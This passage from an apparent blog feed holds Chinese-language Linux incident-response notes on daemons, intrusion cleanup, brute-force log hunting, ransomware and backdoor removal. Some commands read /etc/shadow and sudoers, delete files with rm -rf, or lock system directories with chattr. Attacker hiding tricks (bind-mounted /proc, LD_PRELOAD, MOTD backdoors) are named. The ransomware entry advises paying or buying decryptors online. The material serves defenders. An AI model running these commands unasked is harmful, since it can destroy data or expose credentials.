aux查看信息，发现僵尸进程状态为“Z”</code></pre><p>当一个进程终止时，如果它的子进程仍然处于僵尸状态，那么这些子进程的父进程ID将被重置为1，也就是init进程。此时，init进程会调用wait或waitpid等系统调用来获取这些子进程的终止状态信息，并清除它们的僵尸状态，从而释放系统资源。</p><h4 id="进程终止的几种方式"><a href="#进程终止的几种方式" class="headerlink" title="进程终止的几种方式"></a>进程终止的几种方式</h4><pre><code>main函数自然返回exit，属于C函数库_exit，属于系统调用调用abort函数，异常程序终止，同时发送SIGABRT信号给调用进程接收能导致进程终止的信号 ctrl+c，SIGINT</code></pre><h4 id="如何让进程后台运行"><a href="#如何让进程后台运行" class="headerlink" title="如何让进程后台运行"></a>如何让进程后台运行</h4><pre><code>命令后面加上&amp;，这样是将命令放入到一个作业队列中ctrl+z挂起进程，使用jobs查看序号，再使用bg%序号后台运行进程nohup+&amp;，将标准输出和标准错误缺省会被重定向到nohup文件中，忽略所有SIGHUP挂断信号运行指令前面加上 setsid，使其父进程编程init进程，不受HUP信号影响将命令+&amp;放在（）括号中，也可以是进程不受HUP信号影响</code></pre><h4 id="守护进程"><a href="#守护进程" class="headerlink" title="守护进程"></a>守护进程</h4><p>指在后台运行的，没有控制终端与之相连的进程。<br>它独立于控制终端，周期性的执行某种任务。<br>Linux大多数服务器就是用守护进程的方式实现的，比如WEB服务器。<br>通过ps –x -j以查看作业控制信息，其中TPGID一栏为-1就是守护进程<br>特点：</p><ol><li>随系统启动而启动</li><li>父进程是init，也就是ppid为1</li><li>在后台运行</li><li>进程名字通常以字母 d 结束</li><li>ps显示中终端名设置为问号(?)，终端前台进程组ID设置为-1</li><li>工作目录为 \ (根)</li></ol><h4 id="创建守护进程"><a href="#创建守护进程" class="headerlink" title="创建守护进程"></a>创建守护进程</h4><ul><li>让程序在后台执行：调用fork()产生一个子进程，然后使父进程退出</li><li>调用setsid（）创建一个新对话期。控制终端、登录会话和进程组通常是从父进程进程下来的，守护进程要摆脱他们，不受他们的影响，方法是调用setsid()使进程成为一个会话组长。</li><li>禁止进程重新申请打开控制终端。通过使进程不再是会话组长来实现。再一次通过fork创建新的子进程，使调用fork的进程退出。</li><li>关闭不再需要的文件描述符。首先获得最高文件描述符值，然后用一个循环程序，关闭0到最高文件描述符值的所有文件描述符。</li><li>将当前目录更改为根目录</li><li>子进程从父进程继承的文件创建屏蔽字可能会拒绝某些许可权。为防止这一点，使用unmask(0)将屏蔽字清零。</li><li>将SIGCHLD信号的操作设置为SIG_IGN，子进程结束的时候就不会产生僵尸进程。</li></ul><h4 id="守护进程与后台进程"><a href="#守护进程与后台进程" class="headerlink" title="守护进程与后台进程"></a>守护进程与后台进程</h4><p>后台进程的文件描述符是继承于父进程，例如shell，所以它也可以在当前终端下显示输出数据。<br>但是deemon进程自己变成了进程组长，其文件描述符号和控制终端没有关联，是控制台无关的。<br>基本上任何一个程序都可以后台运行，但守护进程是具有特殊要求的程序，比如要脱离自己的父进程，成为自己的会话组长等，这些要在代码中显式地写出来<br>所以<code>守护进程是后台进程的一种</code>。<br>前台任务会随着session的退出而退出是因为它收到了SIGHUP信号。<br>后台任务是否会受到SIGNUP信号，取决于shell的<code> huponexit </code>参数。可以通过<code> $ shopt | grep huponexit </code>查看该参数的值。</p><h4 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h4><p>一般讨论的都是shell session，我们打开一个新的终端就会创建一个session<br>每个session都是由一个或者多个进程组组成的，每个进程组称为 job，这里job不是任务，而叫作业。<br>调用 setsid() 函数可以生成新的session,那么这些命令可以通过session进行统一管理<br>session中的第一个进程 (一般是bash) 的PID就是session的SID</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>善后处理</title>
      <link href="/2023/08/18/%E5%96%84%E5%90%8E%E5%A4%84%E7%90%86/"/>
      <url>/2023/08/18/%E5%96%84%E5%90%8E%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h5 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h5><pre><code>top d1   //运行top命令后，键入大写字母P按cpu排序ps aux | sort -k4nr   //运行top命令后，键入大写字母M按内存排序ls -la /proc/$pid/exe   //查找进程文件strace -tt  -T -e  trace=all  -p $pid   //跟踪进程运行lsof -p $pid   //进程打开的文件netstat -anltp | grep $pid   //查看进程端口情况</code></pre><h5 id="查看账号"><a href="#查看账号" class="headerlink" title="查看账号"></a>查看账号</h5><pre><code>awk -F &quot;:&quot; &#39;$3==0&#123;print $1&#125;&#39; /etc/passwd   //查看特权用户awk &#39;/\$1|\$6/&#123;print $1&#125;&#39; /etc/shadow   //可远程登录的账号信息cat /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;   //sudo的账号w   //当前用户及其行为lastlog   //所有用户最后登录时间last   //所有用户关键信息grep &quot;Accepted &quot; /var/log/secure* | awk &#39;&#123;print $1,$2,$3,$9,$11&#125;&#39;   //成功登录日期、用户名及ip//查看试图爆破主机的ipgrep refused /var/log/secure* | awk &#123;&#39;print $9&#39;&#125; | sort | uniq -c |sort -nr | moregrep &quot;Failed password&quot; /var/log/secure* | grep -E -o &quot;(([0-9]&#123;1,3&#125;)\.([0-9]&#123;1,3&#125;)\.([0-9]&#123;1,3&#125;)\.([0-9]&#123;1,3&#125;))&quot; | uniq -c grep &quot;Failed password for root&quot; /var/log/secure | awk &#39;&#123;print $11&#125;&#39; | sort   //查看爆破root的ipgrep &quot;Failed password&quot; /var/log/secure | awk &#123;&#39;print $9&#39;&#125; | sort | uniq -c | sort -nr   //查看爆破的用户名字典</code></pre><h5 id="锁定目录"><a href="#锁定目录" class="headerlink" title="锁定目录"></a>锁定目录</h5><pre><code>chmod 000 /usr/bin/风险目录chattr +i /usr/binchattr +i /binchattr +i /tmp</code></pre><h5 id="检查异常文件"><a href="#检查异常文件" class="headerlink" title="检查异常文件"></a>检查异常文件</h5><pre><code>【检查特权文件】find / -perm /6000find / -perm /4000find / -perm /2000【检查corn文件】/var/spool/cron/*/etc/crontab /etc/cron.d/* /etc/cron.daily/*/etc/cron.hourly/* /etc/cron.monthly/* /etc/cron.weekly/ /etc/anacrontab     /var/spool/anacron/*【最近被修改的系统文件】find /etc/ /usr/bin/ /usr/sbin/ /bin/ /usr/local/bin/  -type f -mtime -T | xargs ls -la【被替换的命令/动态链接库劫持】echo $LD_PRELOADecho $LD_LIBRARY_PATH注：基本上上面两个命令回显是空白的，如果有回显大概率是被劫持ls -alt /usr/bin /usr/sbin /bin /usr/local/binrpm -Va&gt;rpm.log</code></pre><h5 id="删除计划任务等"><a href="#删除计划任务等" class="headerlink" title="删除计划任务等"></a>删除计划任务等</h5><pre><code>rm -f /etc/init.d/风险目录rm -f /etc/rc#.d/木马连接文件cat /etc/rc.local   //开机启动项chkconfig --list   //开机启动项注意：建议使用vim查看，cat有可能显示不全</code></pre><h5 id="rootkit查杀"><a href="#rootkit查杀" class="headerlink" title="rootkit查杀"></a>rootkit查杀</h5><p>rootkit主要有两种类型：文件级别和内核级别。<br>文件级别的rootkit: 一般是通过程序漏洞或者系统漏洞进入系统后，通过修改系统的重要文件来达到隐藏自己的目的。<br>内核级rootkit: 是比文件级rootkit更高级的一种入侵方式，它可以使攻击者获得对系统底层的完全控制权，此时攻击者可以修改系统内核，进而截获运行程序向内核提交的命令，并将其重定向到入侵者所选择的程序并运行此程序。内核级rootkit主要依附在内核上，它并不对系统文件做任何修改。以防范为主。<br><strong>查杀工具：</strong><br><a href="http://www.chkrootkit.org/"> chkrootkit </a>、<a href="http://rkhunter.sourceforge.net/"> rkhunter </a>、<a href="http://www.clamav.net/download.html"> ClamAV </a></p><h5 id="其它检查方面"><a href="#其它检查方面" class="headerlink" title="其它检查方面"></a>其它检查方面</h5><ul><li>BASH内置命令<pre><code>compgen -b</code></pre></li><li>BASH函数<pre><code>compgen -funset -f functionName</code></pre></li><li>环境变量<pre><code>envsetexportcat /proc/$PID/environdeclare</code></pre></li><li>SSH key</li><li>SSH config文件<pre><code>/etc/ssh/ssh_config 和 ~/.ssh/config将LocalCommand 和 ProxyCommand 参数封禁</code></pre></li><li>alias命令替换<pre><code>alias 命令的功能是为命令设置别名alert   //检查是否存在替换unalias alert   //删除别名</code></pre></li><li>DNS配置文件<pre><code>/etc/resolv.conf</code></pre></li><li>禁止ptrace_scope操作<pre><code>cat /proc/sys/kernel/yama/ptrace_scope</code></pre></li><li>ASLR<pre><code>cat /proc/sys/kernel/randomize_va_space   //调成2减缓溢出攻击</code></pre></li><li>capabilities<pre><code>getcap -r / 2&gt;/dev/null   //查看对权限的默认情况setcap   //重新设置权限</code></pre></li><li> iptables端口复用<pre><code>sudo iptables -L   //查看默认情况</code></pre></li><li>密码填充检查<pre><code>cat /etc/passwd | cut -d &quot;:&quot; -f 2 | grep -v &quot;x   //默认情况应该是空的</code></pre></li><li>服务检查<pre><code>sudo systemctl list-units --type=service --state=running   //正在运行的服务systemctl status xxx.service   //查看单一服务进程状态systemctl cat xxx.service   //获取服务配置文件systemctl cat </code></pre></li><li>MOTD<pre><code>是Linux中发送问候消息的功能，一般在我们登录服务器后显示每次任意用户登录时都会触发 motd 服务的功能,这个功能的脚本几乎都是使用 root 权限来启动的，所以很适合用来做后门</code></pre></li><li>进程启动文件<pre><code>恶意程序执行后，可能会删除本地文件，但是该文件已经被进程加载，可以通过遍历这种情况来排查恶意程序sudo lsof | grep deletedsudo ls -al /proc/*/exe 2&gt;/dev/null | grep deleted   //建议使用这一个命令</code></pre></li><li>检查系统及应用程序配置文件</li><li>sudo配置文件检查<pre><code>/etc/sudo.conf/etc/sudoers/etc/sudoers.d/</code></pre></li><li>第三方GPG密钥检查<br>```<br>sudo apt-key list<br>具体存储⽬录为 /etc/apt/trusted.gpg.d/</li></ul><p>gpg –quiet –show-keys /etc/pki/rpm-gpg/*<br>具体存储⽬录为 /etc/pki/rpm-gpg/<br>```</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见问题处置方案</title>
      <link href="/2023/08/17/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E5%A4%84%E7%BD%AE%E6%96%B9%E6%A1%88/"/>
      <url>/2023/08/17/%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E5%A4%84%E7%BD%AE%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<h5 id="文件无法删除"><a href="#文件无法删除" class="headerlink" title="文件无法删除"></a>文件无法删除</h5><p><strong>被进程占用：</strong></p><pre><code>lsof xxxx.xx</code></pre><p><strong>文件存在隐藏属性：</strong></p><pre><code>sattr xxxx.xxchattr -a xxxx.xxchattr -i xxxx.xx</code></pre><p><strong>上层文件存在SBIT权限：</strong><br>这种情况只存在于非 root 权限去删除其他用户创建的目录的情况，即使文件权限是 777 也无法进行删除。<br>当目录被设置了粘滞位权限以后，即便用户对该目录有写入权限，也不能删除该目录中其他用户的文件数据，而是只有该文件的所有者和root用户才有权将其删除。<br>这种办法可以保持一种动态的平衡：允许各用户在目录中任意写入、删除数据，但是禁止随意删除其他用户的数据。<br>需要注意的是，粘滞位权限只能针对目录设置，对于文件无效。<br>设置了粘滞位权限的目录，使用ls命令查看其属性时，其他用户权限处的“x”将变为“t”。<br>粘滞位权限都是针对其他用户设置，使用chmod命令设置目录权限时，“o+t”、“o-t”权限模式可分别用于添加、移除粘滞位权限。</p><h5 id="netstat-pantu-不显示-pid-而显示"><a href="#netstat-pantu-不显示-pid-而显示" class="headerlink" title="netstat -pantu 不显示 pid  而显示 -"></a>netstat -pantu 不显示 pid  而显示 -</h5><p>可能是使用了<code>mkdir .hidden  或者  mount -o bind .hidden /proc/PID</code>来隐藏</p><pre><code>cat /proc/$$/mountinfo   //查询挂载信息umount /proc/PID   //取消挂载</code></pre><h5 id="ps和top看不到恶意进程"><a href="#ps和top看不到恶意进程" class="headerlink" title="ps和top看不到恶意进程"></a>ps和top看不到恶意进程</h5><ol><li>挂载被隐藏（看上一个的操作）</li><li>命令被替换（使用busybox进行检修）</li><li>LD_PRELOAD等方法共享库劫持（使用busybox进行检修）</li></ol><h5 id="快速查找文件"><a href="#快速查找文件" class="headerlink" title="快速查找文件"></a>快速查找文件</h5><p>【which】<br>从环境变量查找系统命令的具体文件位置<br>【whereis】<br>从/usr目录快速查找文件<br>【locate】<br>从locatedb数据库查找文件路径<br>【find】<br>强大的搜索命令<br><code>find &lt;检索路径&gt; &lt;选项&gt; &lt;搜索内容&gt;</code><br><a href="https://cloud.tencent.com/developer/article/1348438">具体使用方法</a></p><h5 id="确定系统信息"><a href="#确定系统信息" class="headerlink" title="确定系统信息"></a>确定系统信息</h5><pre><code>cat /etc/issue   //系统版本uname -mgetconf LONG_BIT   //查看系统位数cat /proc/version   //查看内核版本uname -a</code></pre><h5 id="系统完整性检测"><a href="#系统完整性检测" class="headerlink" title="系统完整性检测"></a>系统完整性检测</h5><pre><code>rpm -Va   //Centosapt install debsums   //Ubuntu、Debiandebsums --all --changed</code></pre><h5 id="系统文件监控工具"><a href="#系统文件监控工具" class="headerlink" title="系统文件监控工具"></a>系统文件监控工具</h5><pre><code>AIDE\inotify\tripwire</code></pre><h5 id="查看glibc版本"><a href="#查看glibc版本" class="headerlink" title="查看glibc版本"></a>查看glibc版本</h5><pre><code>ldd --version</code></pre><h5 id="误删文件恢复"><a href="#误删文件恢复" class="headerlink" title="误删文件恢复"></a>误删文件恢复</h5><pre><code>被删除的文件在进程的内存空间还保存着一份，可以通过访问某个目录来找到文件恢复如果正在进行读写操作：lsof   //查找进程文件恢复即可mount   //查看所有挂载点umount   //删除挂载点lsblk -f   //查看所有设备的挂载情况df -T 路径   //可查看该路径的所属挂载点、所在分区、所在分区的文件系统类型cat /proc/filesystems   //查看文件系统的类型常用恢复工具有：Extundelete、Debugfs、R-Linux、Ext3grep、Ext4magic</code></pre><h5 id="批量检索文件并打印信息"><a href="#批量检索文件并打印信息" class="headerlink" title="批量检索文件并打印信息"></a>批量检索文件并打印信息</h5><pre><code>find / -name &quot;内容&quot; | while read line; do if [ -f $line ]; then ls -al $line; elif [ -d $line ]; then ls -al ../ | grep $line; fi; done</code></pre><h5 id="拷贝取证"><a href="#拷贝取证" class="headerlink" title="拷贝取证"></a>拷贝取证</h5><ol><li>使用虚拟化平台存储快照</li><li>打包整个系统</li><li>全盘拷贝（推荐 clonezilla）</li><li>进程拷贝（推荐 CRIU）</li><li>组合运用（冻结进程 + 全盘拷贝 + 恢复进程）</li></ol>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>暴力破解排查</title>
      <link href="/2023/08/16/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%8E%92%E6%9F%A5/"/>
      <url>/2023/08/16/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%8E%92%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<h5 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h5><p>暴力破解一般针对<br>ssh、mysql、ftp、redis、mongodb、smtp</p><h5 id="SSH暴力破解"><a href="#SSH暴力破解" class="headerlink" title="SSH暴力破解"></a>SSH暴力破解</h5><ol><li><p>使用<code>netstat -pantu</code>查看网络状态，重点是PID（当被破解时会有大量的ESTABLISHED）</p></li><li><p>使用<code>awk -F: &#39;&#123;if($3==0) print $1&#125;&#39; /etc/passwd</code>查找特殊权限账号（默认root）</p></li><li><p>查找可以使用ssh登录的账号</p><pre><code>s=$( sudo cat /etc/shadow | grep &#39;^[^:]*:[^\*!]&#39; | awk -F: &#39;&#123;print $1&#125;&#39;);for i in $s;do cat/etc/passwd | grep -v &quot;/bin/false\|/nologin&quot;| grep $i;done | sort | uniq |awk -F: &#39;&#123;print$1&#125;&#39;</code></pre></li><li><p>查看正在连接的ssh-session</p><pre><code>who -awlast -p nowsudo netstat -tnpa | grep &#39;ESTABLISHED.*sshd&#39;pgrep -af sshdecho $SSH_CONNECTIONss | grep ssh</code></pre></li><li><p>查看所有的账号信息</p><pre><code>/var/log/auth.log（Ubuntu）/var/log/secure（centOS）列出当前账户         who am i  </code></pre></li><li><p>查看登录日志</p><pre><code># 查看日志cd /var/log# 成功登录cat /var/log/auth.log | grep &quot;Accept&quot;# 正常退出cat /var/log/auth.log | grep &quot;pam_unix(sshd:session): session closed&quot;# 密码错误cat /var/log/auth.log | grep &quot;authentication failure&quot;# 连续错误cat /var/log/auth.log | grep &quot;message repeated 2 times&quot;</code></pre></li><li><p>统计数据</p><pre><code># 登录失败的用户名及其次数grep &quot;Failed password&quot; /var/log/auth.log|perl -e &#39;while($_=&lt;&gt;)&#123; /for(.*?)from/; print&quot;$1\n&quot;;&#125;&#39;|sort|uniq -c|sort -nr# 登录失败的IP及其次数cat /var/log/auth.log | grep &quot;Failed password for&quot; | grep &quot;root&quot; | grep -Po &#39;(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])(\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d))&#123;3&#125;&#39; |sort|uniq -c|sort -nr</code></pre></li><li><p>加固防护<br>升级SSH版本至少为 7.7版本以上，7.7及以下版本存在SSH用户名枚举<br>加强口令复杂程度<br>禁止root用户登录，可以通过其他用户su到root<br>安装 <a href="https://github.com/fail2ban/fail2ban"><code>fail2ban</code></a> 来进行防御</p></li></ol><h5 id="Mysql暴力破解"><a href="#Mysql暴力破解" class="headerlink" title="Mysql暴力破解"></a>Mysql暴力破解</h5><p>Mysql 默认安装会保留登录日志，在 Ubuntu 上默认位置为 <code>/var/og/mysql/error.log</code></p><ol><li><p>查看登录失败的用户名</p><pre><code>cat /var/log/mysql/error.log | grep &quot;Access denied for user&quot; | grep &quot;using password: YES&quot; | awk -F &quot;&#39;&quot; &#39;&#123;print $2&#125;&#39; | sort | uniq -c | sort -nr</code></pre></li><li><p>查看登录失败的IP及次数</p><pre><code>cat /var/log/mysql/error.log | grep &quot;Access denied for user&quot; | grep &quot;using password: YES&quot; | awk -F &quot;&#39;&quot; &#39;&#123;print $2&#125;&#39; | sort| uniq | while read line;do echo $line;cat /var/log/mysql/error.log | grep &quot;Access denied for user&quot; | grep &quot;using password&quot; | awk -F &quot;&#39;&quot; &#39;&#123;print $4&#125;&#39; | sort | uniq -c | sort -nr; done</code></pre></li></ol><h5 id="FTP暴力破解"><a href="#FTP暴力破解" class="headerlink" title="FTP暴力破解"></a>FTP暴力破解</h5><ol><li>查看网络连接（如果有爆破会有大量的ESTABLISHED状态和TIME WAIT状态的网络连接）<pre><code>netstat -pantu</code></pre></li><li>查看最近的一个ftp会话（也可以用ftpwho查找）<pre><code>last -w -t</code></pre></li><li>查找日志<pre><code>cat /var/log/vsftpd.log   具体的位置可能不太一样，需要自己查找</code></pre></li><li>查找登录失败的账号<pre><code>cat /var/log/vsftpd.log | grep FAIL | cut -d &quot;[&quot; -f 3 | cut -d &quot;]&quot; -f 1 | sort | uniq -c | sort -nr</code></pre></li><li>查找登录失败的IP<pre><code>cat /var/log/vsftpd.log | grep FAIL | cut -d &quot;[&quot; -f 3 | cut -d &quot;]&quot; -f 1 | sort | uniq | while read line;do echo $line;cat /var/log/vsftpd.log | grep $line | cut -d &quot;:&quot; -f 7 | cut -d &#39;&quot;&#39; -f 1 | sort | uniq -c | sort -nr; done</code></pre></li><li>FTP服务加固<br>禁用 anonymous 和 ftp 两个账号<br>使用 SSL 加密 FTP<br>安装 fail2ban 来进行防御</li></ol><h5 id="Redis未授权暴力破解"><a href="#Redis未授权暴力破解" class="headerlink" title="Redis未授权暴力破解"></a>Redis未授权暴力破解</h5><p>将redis.conf 中的 requirepass 前的注释打开，并且设置一个复杂密码<br>缩减开放端口，建议仅在本机127.0.0.1使用<br>配置完成后需要重启来生效</p><ul><li>只有手动设置logfile才能保存日志，默认不设置默认的日志级别notice是不会记录登录、执行指令、退出的。</li><li>loglevel设置为 verbose或者debug才会记录登录主机</li><li>执行的指令<code>info，set</code>等即使 loglevel是 debug 级别也不会记录，但是会记录我们设置了多少个key， 具体key名称以及内容不会记录</li></ul><p><strong>虽然如此，但是失败成功的登录日志都是一样的……</strong><br><strong>没办法区分是不是攻击行为，只能问有没有人那个时候登过了</strong></p><h5 id="MongoDB暴力破解"><a href="#MongoDB暴力破解" class="headerlink" title="MongoDB暴力破解"></a>MongoDB暴力破解</h5><p>默认配置文件位置为 /etc/mongodb.conf<br>默认的的日志位置为 /var/og/mongodb/mongodb.log<br>打开verbose后能看到大量的failed事件<br>在/var/log/mongodb/mongodb.log查看</p><ol><li>登录失败的账户<pre><code>cat /var/log/mongodb/mongodb.log | grep -v &quot;UserNotFound&quot;|grep failed | awk -F &quot; &quot; &#39;&#123;print $9&#125;&#39; | sort|uniq -c|sort -nr</code></pre></li><li>登录所有账户失败的IP及次数<pre><code>cat /var/log/mongodb/mongodb.log | grep -v &quot;UserNotFound&quot;|grep failed | awk -F &quot; &quot; &#39;&#123;print $9&#125;&#39; |sort | uniq | while read line;do echo $line;cat /var/log/mongodb/mongodb.log |grep -v &quot;UserNotFound&quot; | grep failed | grep $line | awk -F &quot; &quot; &#39;&#123;print $14&#125;&#39; | cut -d &quot;:&quot; -f 1 | sort | uniq -c | sort -nr; done</code></pre></li><li>不存在账户的爆破事件<pre><code>cat /var/log/mongodb/mongodb.log | grep &quot;UserNotFound&quot;|grep failed | awk -F &quot; &quot; &#39;&#123;print $9&#125;&#39; |sort | uniq | while read line;do echo $line;cat /var/log/mongodb/mongodb.log |grep &quot;UserNotFound&quot; | grep failed | grep $line | awk -F &quot; &quot; &#39;&#123;print $14&#125;&#39; | cut -d &quot;:&quot; -f 1 | sort | uniq -c | sort -nr; done</code></pre></li></ol><h5 id="SMTP暴力破解"><a href="#SMTP暴力破解" class="headerlink" title="SMTP暴力破解"></a>SMTP暴力破解</h5><p>SMTP负责发，POP3、IMAP负责收，POP3协议客户端收到邮件，服务器端就会将其删除，除非有特殊的配置。<br>IMAP则弥补了这一缺陷，客户端该收收，服务端还给你保存着，同时你在客户端的各种配置操作都会在服务器上进行同步</p><pre><code>验证失败的账户IPcat /var/log/mail.log | grep &quot;authentication failed&quot; | grep -Po &#39;(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])(\.(1\d&#123;2&#125;|2[0-4]\d|25[0-5]|[1-9]\d|\d))&#123;3&#125;&#39; |sort|uniq -c|sort -nr</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>勒索病毒排查</title>
      <link href="/2023/08/15/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E6%8E%92%E6%9F%A5/"/>
      <url>/2023/08/15/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E6%8E%92%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<h5 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h5><p>正常情况下遇到勒索病毒就两种方法，要么找办法解开要么给钱。</p><h5 id="处置方法"><a href="#处置方法" class="headerlink" title="处置方法"></a>处置方法</h5><ol><li>查找勒索病毒特征，收集相关信息</li><li>深信服千里目实验室公众号直接回复病毒关键字</li><li>安全响应及EDR知识赋能平台</li><li>Freebuf</li><li>淘宝、闲鱼</li></ol><h5 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h5><p><strong>有解密工具就用解密工具<br>无解密工具就交钱</strong></p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>远控后门排查</title>
      <link href="/2023/08/14/%E8%BF%9C%E6%8E%A7%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5/"/>
      <url>/2023/08/14/%E8%BF%9C%E6%8E%A7%E5%90%8E%E9%97%A8%E6%8E%92%E6%9F%A5/</url>
      
        <content type="html"><![CDATA[<h5 id="获取事件告警信息"><a href="#获取事件告警信息" class="headerlink" title="获取事件告警信息"></a>获取事件告警信息</h5><p>监控EDR、态势感知、防火墙等平台查看威胁告警以及日志。</p><h5 id="定位后门文件"><a href="#定位后门文件" class="headerlink" title="定位后门文件"></a>定位后门文件</h5><pre><code>根据告警信息定位后门文件位置，查找进程pidlsof | grep xxxx.xxlsof /root/xxxx.xxfuser /root/xxxx.xx</code></pre><h5 id="查看外连事件详情"><a href="#查看外连事件详情" class="headerlink" title="查看外连事件详情"></a>查看外连事件详情</h5><pre><code>根据五元组来查找通信的端口ip对应的pidnetstat -pantu | grep 114.114.114.114netstat -pantu | grep 65533lsof -i:65533netstat -pantu | grep 65533lsof -i:65533</code></pre><h5 id="查找进程信息"><a href="#查找进程信息" class="headerlink" title="查找进程信息"></a>查找进程信息</h5><pre><code>查找进程相关文件lsof -p 1234   （需要root权限）pwdx获取pid程序详细信息lsof -p pidpwdx pidsystemctl status pidcat /proc/pid/mapsls -al /proc/pid/exe</code></pre><h5 id="根据pid查看对应线程"><a href="#根据pid查看对应线程" class="headerlink" title="根据pid查看对应线程"></a>根据pid查看对应线程</h5><pre><code>ps H -T -p pidps -aLf pidpstree -agplU（推荐使用）</code></pre><h5 id="确定进程运行时间"><a href="#确定进程运行时间" class="headerlink" title="确定进程运行时间"></a>确定进程运行时间</h5><pre><code>ps -eo pid,lstart,etime,cmd | grep &lt;pid&gt;</code></pre><h5 id="比对恶意文件的创建时间"><a href="#比对恶意文件的创建时间" class="headerlink" title="比对恶意文件的创建时间"></a>比对恶意文件的创建时间</h5><pre><code>stat xxx.xxls -al xxx.xx</code></pre><h5 id="样本采集分析"><a href="#样本采集分析" class="headerlink" title="样本采集分析"></a>样本采集分析</h5><pre><code>使用SCP/Xshell等将样本移出主机，计算哈希值后到威胁情报平台中去搜索certutil -hashfile 文件 MD5</code></pre><h5 id="进程查杀"><a href="#进程查杀" class="headerlink" title="进程查杀"></a>进程查杀</h5><pre><code>【查找子进程】ps ajfxsystemctl status【杀死进程】kill -9 pid   （这样子是杀不死子进程的！！！）kill -9 -pid   （杀掉进程组）</code></pre><h5 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h5><pre><code># 查看文件占用，解除占用后删除lsof xxxx.xx# 移除 i, a 属性chattr -ia file.sh# 查看是否移除成功lsattr file.sh# 移除文件rm -rf file.sh# 奇怪文件名无法删除，先查inode再删除ls -li xxxx.xxfind ./* -inum 12327526 -deletefind ./ -inum 12327526 -exec rm &#123;&#125; \;find ./* -inum 12327526 -exec rm -i &#123;&#125; \;find ./* -inum 12327526 -exec rm -f &#123;&#125; \;find ./* -inum 12327526 |xargs rm -frm `find ./* -inum 12327526`# 目录挂载无法删除（Device or resource busy）sudo lsblk -asudo umount /dev/sdb1rm -rf xxxx.xx</code></pre><h5 id="补充：守护进程"><a href="#补充：守护进程" class="headerlink" title="补充：守护进程"></a>补充：守护进程</h5><pre><code># 守护进程是什么？其他进程都是在用户登录或运行程序时创建，在运行结束或用户注销时终止，但系统服务进程（守护进程）不受用户登录注销的影响，它们一直在运行着。# 守护进程的本质是什么？（1）守护进程的本职就是孤儿进程，该进程自成会话，自成进程组，一般守护进程与终端无关；（即：pid=sid=gid）（2）后台进程受用户登录注销的影响，而守护进程不受用户登录和注销的影响。但是它们都受关机的影响。# 守护进程有什么特点？1. 没有控制终端，终端名设置为？号2. 父进程不是用户创建的进程，一般由init进程或者systemd（pid=1）的进程为父进程3. 进程名字通常以字母 d 结束4. 工作目录为/（根），主要是为了防止占用磁盘导致无法卸载磁盘5. 以kthreadd内核进程创建的守护进程以kthreadd为父进程# 守护进程如何设置？1. 执行一个fork()，之后父进程退出，子进程继续执行。2. 子进程调用setsid()开启一个新回话并释放它与控制终端之间的所有关联关系。3. 在setsid()调用之后执行第二个fork()，让父进程退出并让孙进程继续执行。确保了子进程不会成为会话组长。（根据System V中获取终端的规则，进程永远不会重新请求一个控制终端。多一个fork()调用不会带来任何坏处。）4. 使用  umask(0);  清除进程的umask以确保当daemon创建文件和目录时拥有所需的权限。5. 修改进程的当前工作目录，通常会改为根目录（/）。6. 关闭daemon从其父进程继承而来的所有打开着的文件描述符。# 守护进程如何删除？1. 首先ps axj | grep 守护进程名字，找到相应的守护进程，然后使用kill -9 守护进程名杀掉；2. 利用ps -ef命令查找相应的守护进程，再用kill -9命令将其杀死；3. 创建shell脚本对进程的启动、关闭、重启进行自动管理。注：kill -9 -pid   （杀掉进程组）</code></pre><h5 id="补充：screen的原理"><a href="#补充：screen的原理" class="headerlink" 